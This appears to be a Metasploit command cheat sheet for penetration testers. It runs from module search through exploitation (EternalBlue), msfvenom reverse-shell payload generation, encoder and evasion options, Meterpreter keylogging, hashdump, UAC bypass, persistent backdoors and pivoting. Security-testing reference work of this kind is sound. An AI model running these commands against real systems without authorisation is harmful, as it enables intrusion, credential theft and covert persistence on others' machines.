# The-Complete-Metasploit-Guide
A comprehensive resource covering everything about Metasploit from basic commands to advanced exploitation techniques.

## Table of Contents
- [Core Commands](#core-commands)
- [Module Management](#module-management)
- [Exploitation](#exploitation)
- [Session Management](#session-management)
- [Auxiliary Modules](#auxiliary-modules)
- [Post-Exploitation](#post-exploitation)
- [Network Configuration](#network-configuration)
- [Database Integration](#database-integration)
- [Advanced Module Commands](#advanced-module-commands)
- [Payload Customization](#payload-customization)
- [Exploit Adjustments](#exploit-adjustments)
- [Job Control](#job-control)
- [Environmental Settings](#environmental-settings)
- [Meterpreter Commands](#meterpreter-commands)
- [Privilege Escalation and Persistence](#privilege-escalation-and-persistence)
- [Pivoting](#pivoting)
- [Logging and Reporting](#logging-and-reporting)

## Core Commands
- **Help Menu**: `help` or `?` - Display the help menu with available commands.
- **Version**: `version` - Show the version of Metasploit.
- **Exit**: `exit` - Exit the Metasploit console.

## Module Management
- **Search Modules**: `search <keyword>` - Search for specific modules.
- **Load Module**: `use <module>` - Load a module (e.g., `use exploit/windows/smb/ms17_010_eternalblue`).
- **Show Options**: `show options` - Display the options for the loaded module.
- **Set Option**: `set <option> <value>` - Set an option (e.g., `set RHOSTS 192.168.1.100`).
- **Show Payloads**: `show payloads` - List available payloads for the selected module.
- **Set Payload**: `set PAYLOAD <payload>` - Set a specific payload (e.g., `set PAYLOAD windows/meterpreter/reverse_tcp`).
- **Show Targets**: `show targets` - List available targets for the module.
- **Set Target**: `set TARGET <target_id>` - Specify the target ID.

## Exploitation
- **Check Vulnerability**: `check` - Check if the target is vulnerable.
- **Execute Exploit**: `exploit` or `run` - Execute the exploit.
- **Background Job**: `exploit -j` - Run the exploit in the background as a job.
- **No Interaction**: `exploit -z` - Launch the exploit but do not interact with the session.

## Session Management
- **List Sessions**: `sessions -l` - List all active sessions.
- **Interact with Session**: `sessions -i <id>` - Interact with a specific session by its ID.
- **Kill Session**: `sessions -k <id>` - Kill a specific session.

## Auxiliary Modules
- **Show Auxiliary**: `show auxiliary` - Display auxiliary modules.
- **Load Auxiliary Module**: `use auxiliary/scanner/<module>` - Load an auxiliary module (e.g., `use auxiliary/scanner/portscan/tcp`).

## Post-Exploitation
- **Use Post Module**: `use post/<module>` - Use a post-exploitation module.
- **Run Post Module**: `run` - Execute the post-exploitation module.

## Network Configuration
- **Set Global Option**: `setg <option> <value>` - Set a global option (e.g., `setg RHOSTS 192.168.1.0/24`).
- **Add Route**: `route add <subnet> <netmask> <session_id>` - Add a route through a specific session.

## Database Integration
- **Connect to Database**: `db_connect` - Connect to a database.
- **Show Hosts**: `hosts` - Display hosts from the database.
- **List Services**: `services` - List services discovered on the hosts.
- **Show Vulnerabilities**: `vulns` - Show vulnerabilities.

## Advanced Module Commands
- **Show Encoders**: `show encoders` - Display available encoders to obfuscate payloads.
- **Set Encoder**: `set ENCODER <encoder>` - Set a specific encoder (e.g., `set ENCODER x86/shikata_ga_nai`).
- **Show Evasion**: `show evasion` - List available evasion techniques to bypass security mechanisms.
- **Set Evasion**: `set EVASION <evasion_method>` - Specify an evasion method.

## Payload Customization
- **Generate**: `generate` - Create a standalone payload with specified options.
- **Use Msfvenom**: Outside the console, generate a custom payload:
  ```bash
  msfvenom -p windows/meterpreter/reverse_tcp LHOST=<ip> LPORT=<port> -f exe -o payload.exe

  ## Exploit Adjustments
- **Set AutoRunScript**: `set AutoRunScript <script>` - Set a script to execute automatically after exploit success.
- **Set LHOST**: `set LHOST <IP>` - Set the local IP address for reverse connections.
- **Set LPORT**: `set LPORT <Port>` - Set the local port for reverse connections.

## Job Control
- **List Jobs**: `jobs` - List all running jobs.
- **Kill Job**: `jobs -k <job_id>` - Kill a specific job.
- **Terminate All Jobs**: `jobs -K` - Terminate all jobs.

## Environmental Settings
- **Set Global RHOSTS**: `setg RHOSTS <range>` - Set a global range of target hosts.
- **Unset Global Option**: `unsetg <option>` - Remove a globally set option.
- **Run Resource File**: `resource <file>` - Run a set of commands from a file.

## Meterpreter Commands (Post-Exploitation)
- **System Info**: `sysinfo` - Display target system information.
- **Get User ID**: `getuid` - Show the user ID of the current session.
- **List Processes**: `ps` - List running processes on the target.
- **Migrate**: `migrate <pid>` - Move the Meterpreter session to a different process.
- **Upload**: `upload <local_path> <remote_path>` - Upload files to the target.
- **Download**: `download <remote_path> <local_path>` - Download files from the target.
- **Start Keystroke Capture**: `keyscan_start` - Start capturing keystrokes.
- **Dump Keystrokes**: `keyscan_dump` - Retrieve captured keystrokes.
- **Screenshot**: `screenshot` - Capture a screenshot of the target's screen.
- **Hashdump**: `hashdump` - Dump the hashes of user passwords.

## Privilege Escalation and Persistence
- **Get System Privileges**: `getsystem` - Attempt to gain system-level privileges.
- **Bypass UAC**: `use exploit/windows/local/bypassuac` - Exploit to bypass User Access Control (UAC).
- **Run Persistence**: `run persistence` - Install a persistent backdoor.

## Pivoting
- **Port Forwarding**: `portfwd add -l <local_port> -p <remote_port> -r <remote_host>` - Forward ports through the compromised host.
- **SOCKS5 Proxy**: `socks5` - Set up a SOCKS5 proxy for pivoting.

## Logging and Reporting
- **Display Loot**: `loot` - Display collected loot from exploits or scans.
- **Notes**: `notes` - View or add notes for specific hosts.

